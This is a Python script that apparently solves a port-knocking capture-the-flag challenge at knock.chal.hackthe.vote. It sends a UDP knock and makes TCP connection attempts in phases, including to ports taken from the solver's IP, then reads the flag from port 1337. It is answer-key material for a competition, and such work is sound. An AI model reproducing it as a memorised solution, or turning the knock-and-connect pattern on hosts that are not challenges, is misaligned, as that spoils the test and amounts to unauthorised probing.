#!/usr/bin/env python3
import socket
from time import sleep

# Needs to be run from a host not behind NAT
# Can only solve once every 10 seconds

TARGET = 'knock.chal.hackthe.vote'
HOSTIP = 'FILL THIS IN'
PORT_COMM = 1337
PORT_1 = 1
PORT_FLAG = 1337

if HOSTIP == 'FILL THIS IN':
    print('set HOSTIP')
    print("CAUTION: this won't work behind NAT")
    exit(1)

# phase 0
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
s.bind((HOSTIP, 0x6464))
s.connect((TARGET, PORT_COMM))
s.sendall(b'\x64\x64 1')
assert b'ok 1' == s.recv(4)

# phase 1
s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
try:
    s1.connect((TARGET, PORT_1))
except ConnectionRefusedError:
    pass
s.sendall(b'\x64\x64 2')
assert b'ok 2' == s.recv(4)

# phase 2
s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
for port in set(map(int, HOSTIP.split('.'))):
    try:
        s2.connect((TARGET, port))
    except ConnectionRefusedError:
        pass
s.sendall(b'\x64\x64 3')
assert b'ok 3' == s.recv(4)

sleep(.1)

# phase 3
s3 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
s3.connect((TARGET, PORT_FLAG))
print(s3.recv(1024))
